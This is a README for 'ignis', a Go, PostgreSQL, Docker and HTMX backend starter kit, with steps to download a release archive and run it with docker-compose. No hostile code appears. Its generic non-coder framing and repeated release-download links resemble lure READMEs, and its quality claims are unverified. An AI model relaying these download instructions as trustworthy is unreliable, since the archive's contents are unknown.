# 🔥 ignis - Simple Backend Setup Starter Kit

[![Download ignis](https://img.shields.io/badge/Download-ignis-blue?style=for-the-badge)](https://github.com/NhatThanh009/ignis/releases)

---

## ❓ What is ignis?

Ignis is a ready-made starter project. It helps you build backend services that power websites or apps. It uses the Go programming language but does not require you to know how to code.

This project includes tools and settings already done for you. You get a strong base to create web servers that talk to databases and manage data safely. Ignis supports REST APIs, which let different programs or devices communicate easily.

Behind the scenes, ignis uses helpful software such as:

- **Go (Golang):** A programming language for fast and reliable servers.
- **PostgreSQL:** A database system for storing data.
- **Docker & Docker Compose:** Tools to run the app inside containers without manual setup.
- **HTMX:** To make web pages interactive.
- **sqlc:** Helps make database code easier to write and manage.

This project works as a “batteries-included” pack. That means most parts you need are ready to go.

---

## 📋 System Requirements

Before downloading ignis, make sure your computer meets these minimum specs:

- **Operating System:** Windows 10 or later, macOS 10.13 or later, or Linux (any recent distribution)
- **Processor:** 1.5 GHz or faster, 64-bit recommended
- **Memory (RAM):** At least 4 GB free
- **Disk Space:** 500 MB free for the app files and dependencies
- **Software:**
  - Docker and Docker Compose installed (needed to run ignis easily)
  - Internet connection to download necessary files

---

## 🚀 Getting Started

Follow these steps to get ignis up and running on your computer.

### Step 1: Download ignis

To get the files you need, visit the releases page below:

[Download ignis here](https://github.com/NhatThanh009/ignis/releases)

Click this link to open the page in your browser. On the page, look for the latest release. Download the zip or tarball file with the files inside.

### Step 2: Install Docker and Docker Compose

Ignis uses Docker to run. This will save you from setting up everything manually.

- Go to [https://www.docker.com/get-started](https://www.docker.com/get-started)  
- Download and install Docker Desktop for your operating system.
- Follow their instructions to install Docker Compose (usually included with Docker Desktop).

After installation, make sure to restart your computer if asked.

### Step 3: Extract ignis Files

Once you download the release file, follow these steps:

- Locate the downloaded `.zip` or `.tar.gz` file.
- Extract the contents to a folder you can find easily, such as `Documents\ignis` or `Desktop\ignis`.

### Step 4: Open the Project Folder

- On Windows: Open the `ignis` folder using File Explorer.
- On macOS or Linux: Use Finder or your file manager to open the folder.

### Step 5: Run the Application

Open a terminal (Command Prompt on Windows, Terminal on macOS/Linux):

- Navigate to the folder where you extracted ignis. For example,  
  ```
  cd Desktop/ignis
  ```

- Start the application by typing:  
  ```
  docker-compose up
  ```

This command tells Docker to start ignis with all the parts it needs, such as the web server and database.

### Step 6: Accessing the Ignis Service

Open your web browser and go to:

```
http://localhost:8080
```

You should see a welcome page or interface provided by ignis.

---

## 🔧 What’s Included

Ignis comes with the following features out of the box:

- A production-ready layout for backend projects using Go.
- Pre-configured database support with PostgreSQL.
- Ready-to-use REST API endpoints.
- Tools to make your website interactive using HTMX.
- Docker setup to avoid manual installation issues.
- Documentation and example code to help you understand how it works.
- SQL code generator (sqlc) for easy database queries.

---

## 🛠 How To Use ignis

Even if you have no programming background, you can try these basic tasks:

- Check the backend server status by visiting `http://localhost:8080/health`.
- Explore sample API calls using tools like Postman or your browser.
- Modify simple settings inside configuration files (instructions included).

If you want to learn more, you can review the README inside the downloaded files or visit the code for guided examples.

---

## 📥 Download & Install

Visit the official releases page to download ignis:

[https://github.com/NhatThanh009/ignis/releases](https://github.com/NhatThanh009/ignis/releases)

Pick the latest release version, download the archive, and follow the steps above to extract and run the app with Docker.

---

## ❗ Troubleshooting

If ignis does not start:

- Ensure Docker is installed and running. You can check by running `docker --version` in your terminal.
- Check that no other app uses port 8080.
- Restart your computer to clear network issues.
- Review Docker logs by running `docker-compose logs` in the project folder for error messages.
- Search online for Docker or ignis issues if needed.

---

## 📚 Additional Resources

- To learn about Docker: [https://docs.docker.com/get-started/](https://docs.docker.com/get-started/)
- Go programming language info: [https://golang.org/doc/](https://golang.org/doc/)
- PostgreSQL documentation: [https://www.postgresql.org/docs/](https://www.postgresql.org/docs/)
- Explore REST API concepts: [https://restfulapi.net/](https://restfulapi.net/)
- HTMX introduction: [https://htmx.org/](https://htmx.org/)

---

## ⚙️ Technical Details

Ignis uses:

- **Go** to create fast, secure web services.
- **sqlc** to transform SQL queries into Go code automatically.
- **PostgreSQL** as its database.
- **Docker and Docker Compose** to package and run ignis in isolated environments.
- **HTMX** for creating dynamic web pages without heavy JavaScript.

This setup provides a stable, tested environment suited for backend developers and those wanting to explore web services.

---

[![Download ignis](https://img.shields.io/badge/Download-ignis-blue?style=for-the-badge)](https://github.com/NhatThanh009/ignis/releases)